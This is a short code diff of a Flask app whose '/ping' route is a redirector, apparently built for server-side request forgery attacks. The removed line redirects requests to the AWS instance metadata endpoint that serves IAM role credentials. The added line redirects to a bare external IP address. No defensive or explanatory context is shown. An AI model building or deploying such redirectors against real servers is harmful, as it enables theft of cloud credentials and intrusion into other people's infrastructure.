@@ -5,7 +5,7 @@ app = Flask(__name__)
 
 @app.route('/ping')
 def hello():
-    return redirect("http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name", code=302)
+    return redirect("http://68.183.116.64:8080", code=302)
 
 if __name__ == '__main__':
     # Bind to PORT if defined, otherwise default to 5000.
